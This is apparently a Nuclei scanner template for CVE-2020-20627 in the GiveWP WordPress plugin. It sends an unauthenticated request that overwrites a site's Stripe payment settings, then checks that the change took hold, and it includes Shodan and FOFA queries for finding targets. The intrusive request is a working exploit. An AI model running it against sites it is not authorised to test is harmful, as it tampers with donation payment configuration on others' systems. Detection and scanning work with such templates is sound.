flow: http(1) && http(2)
http:
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - len(body) == 0
    internal: true
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/wp-admin/admin-post.php?page=give-settings&stripe_publishable_key={{stripe_publishable_key}}&stripe_publishable_key_test={{stripe_publishable_key_test}}&stripe_user_id={{stripe_user_id}}&stripe_access_token={{stripe_access_token}}&stripe_access_token_test={{stripe_access_token_test}}&connected=1'
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - /wp-content/plugins/give/
    - '"base_country":'
    - '"stripe_card_update":'
    - '"stripe_account_id":"{{stripe_user_id}}"'
  - part: content_type
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}'
id: CVE-2020-20627
info:
  author: daffainfo
  classification:
    cpe: cpe:2.3:a:givewp:givewp:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2020-20627
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
    cvss-score: 5.3
    cwe-id: CWE-306
    epss-percentile: 0.90482
    epss-score: 0.06148
  description: 'GiveWP plugin through 2.5.9 for WordPress contains an unauthenticated
    settings change caused by insecure access in includes/gateways/stripe/includes/admin/admin-actions.php,
    letting attackers modify settings without authentication, exploit requires no
    authentication.

    '
  impact: 'Attackers can modify plugin settings without authentication, potentially
    leading to unauthorized transactions or configuration changes.

    '
  metadata:
    fofa-query: body="/wp-content/plugins/give/"
    framework: wordpress
    max-request: 2
    product: givewp
    publicwww-query: wp-content/plugins/give
    shodan-query: http.html:"/wp-content/plugins/give/"
    vendor: givewp
    verified: true
  name: GiveWP - Missing Authorization to Settings Update
  reference:
  - https://blog.nintechnet.com/multiple-vulnerabilities-fixed-in-wordpress-givewp-plugin/
  - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/give/givewp-259-missing-authorization-to-settings-update
  - https://nvd.nist.gov/vuln/detail/CVE-2020-20627
  - https://github.com/20142995/nuclei-templates
  remediation: 'Update to the latest version of GiveWP plugin that addresses this
    issue.

    '
  severity: medium
  tags: cve,cve2020,wp,wordpress,wp-plugin,givewp,unauth,intrusive,vkev
variables:
  stripe_access_token: '{{randbase(8)}}'
  stripe_access_token_test: '{{randbase(8)}}'
  stripe_publishable_key: '{{randbase(8)}}'
  stripe_publishable_key_test: '{{randbase(8)}}'
  stripe_user_id: '{{randbase(8)}}'
